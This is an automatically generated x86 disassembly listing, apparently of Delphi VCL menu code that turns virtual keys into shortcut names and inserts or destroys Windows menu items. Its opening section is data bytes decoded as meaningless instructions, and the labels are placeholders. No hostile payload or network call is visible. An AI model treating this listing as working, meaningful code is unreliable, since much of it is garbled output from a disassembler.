add [ esi + edx * 8 + 0x45 ] bl
add [ edx + ebx * 8 + 0x45 ] al
add [ 0x6e654d54 ] al
add [ eax ] al
add [ eax + 0x49050002 ] al
je r-xdata
xchg edx eax
inc ebp
add [ edi ] al
add eax 0x6e654d54
jne r-xdata
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax - 0x2b ] ah
inc ebp
add [ esi + ebx * 8 ] cl
inc ebp
add ah bh
jecxz r-xdata
insd
cmp al 0xde
xchg ecx eax
inc ebp
add [ eax + 0x300418f ] bl
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax - 0x1d ] al
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rol [ ebx + edx * 4 ] 0x45
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xb8756e65
xchg edx eax
inc ebp
add [ edx + edx * 4 ] ch
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] bh
add [ eax ] al
add eax [ eax ]
std
add [ eax - 0x2a ] dl
inc ebp
add [ esi + ebx * 8 ] bh
inc eax
add [ eax + 0x4592 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
xchg edx eax
inc ebp
add [ eax ] ah
add [ eax ] al
js r-xdata
jae r-xdata
cmp [ esi + 0x340045 ] cl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
add [ eax ] bh
mov es [ ebp ]
xor al 0x0
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xdc65646f
outsd
inc ebp
dec eax
outsd
je r-xdata
add al dh
loop r-xdata
add [ esp + ecx * 4 + 0x45 ] dl
add al ah
loop r-xdata
jne r-xdata
push esp
dec ebp
outsb
inc ebp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
cld
aad 0x45
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esi + ebx * 8 ] ah
inc ebp
add al al
fiadd [ ebp ]
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax - 0x23 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jns r-xdata
outsd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
push eax
xchg esp eax
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
add [ eax ] cl
add bh bh
test dh bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
fsubr [ edi + 0x45 ]
push esp
mov [ ebp ] es
add bl ah
inc ebp
add [ eax ] dl
jecxz r-xdata
insd
popad
jae r-xdata
pop es
add [ esi ] al
je r-xdata
rcl [ ebp + eax * 2 + 0x540f0300 ] 0x1
jo r-xdata
outsb
je r-xdata
ja r-xdata
pushfd
jpo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
jae r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edx * 4 + 0x45 ] cl
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
dec esp
xchg esp eax
inc ebp
adc [ eax ] al
inc ecx
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
dec eax
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add [ eax ] al
[ eax - 0x1e ]
dec ecx
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp [ eax ]
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ eax ] cl
xor al [ eax ]
cld
0xacac0045 0x41
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
dec ebp
outsb
push esp
dec esp
je r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
outsd
cmp [ ebp + 0xe060045 ] dl
je r-xdata
jne r-xdata
int3
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + edx * 4 + 0x740d0045 ] cl
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
jne r-xdata
xchg esp eax
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
add [ esp + esi + 0x31ec0040 ] ah
inc eax
xor al 0x40
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ecx
xchg esp eax
inc ebp
add [ ebp - 0x6a63ffc0 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
xchg ebp eax
inc ebp
add [ eax ] al
outsd
dec esp
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
push cs
je r-xdata
nop
xchg esp eax
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
insd
inc ebp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
or eax 0x6f42616d
outsb
add eax 0x756e654d
jae r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xchg ebp eax
inc ebp
add [ eax ] bh
add [ eax ] al
js r-xdata
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
popad
push esp
outsd
sub_4598f8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_448830
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e08c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_459950
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_459988
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403fa4
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404214
sub_4599dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_459bc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40403c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40418c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40403c
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40403c
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40418c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40418c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403fa4
mov eax esi
call sub_403fa4
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40403c
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408408
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042b0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_459988
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40426c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40403c
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40426c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40426c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459bcc
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fc8
retn
sub_459be0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404264
push eax
mov eax edi
call sub_404264
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404264
push eax
mov eax edi
call sub_404464
push eax
mov eax [ esi ]
call sub_404464
pop edx
pop ecx
call sub_4082e8
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404264
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404504
sub_459c3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404454
xor eax eax
push ebp
push sub_459d17
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_459be0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_459be0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_459be0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_459be0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459d1e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4599dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408298
test eax eax
jne r-xdata
sub_459d54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45c2f4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45c304
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_459db4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45c2f4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45c2f4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45c304
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45c304
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_459d54
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_459d54
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45c304
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45c304
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_459f00
push ebx
mov ebx eax
mov eax ebx
call sub_4565f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45eeb8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_459f38
push ebx
mov ebx eax
mov eax ebx
call sub_456604
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459f68
push ebx
mov ebx eax
mov eax ebx
call sub_456618
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459f98
push ebx
mov ebx eax
mov eax ebx
call sub_456640
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459fc8
push ebx
mov ebx eax
mov eax ebx
call sub_456668
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043b0
je r-xdata
mov al 0x1
pop ebx
retn
sub_459ffc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45662c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45a038
push ebx
mov ebx eax
mov eax ebx
call sub_45667c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45a06c
push ebx
mov ebx eax
mov eax ebx
call sub_456690
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45a0a0
push ebx
mov ebx eax
mov eax ebx
call sub_4566a4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45a0d4
push ebx
mov ebx eax
mov eax ebx
call sub_4208b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45a0fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45a11c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45c15c
sub_45a13c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45c1cc
sub_45a15c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45c220
sub_45a17c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45a198
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ff8
sub_45a1bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45c34c
sub_45a1dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45c328
sub_45a1fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45c33c
sub_45a21c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45a248
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_459d34
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45cc58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_45a2c4
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45ec9c
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45c2f4
test eax eax
jg r-xdata
mov edx esi
call sub_45c68c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45c304
call sub_403254
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403254
lea eax [ esi + 0x44 ]
call sub_40d788
lea eax [ esi + 0x78 ]
call sub_40d788
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45a6e0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41aae0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
call sub_403254
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45a378
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a5d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a5da
lea eax [ ebp - 0x40 ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_40403c
mov eax ebx
call sub_45c2f4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45a888
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043b0
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45c2f4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45c8b0
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_4599dc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404324
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404464
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404464
push eax
mov eax ebx
call sub_45a888
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45becc
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043b0
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404464
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45c2f4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45a888
mov [ ebp - 0x25 ] eax
sub_45a5f3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45a378
xor eax eax
pop ebp
retn
sub_45a618
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
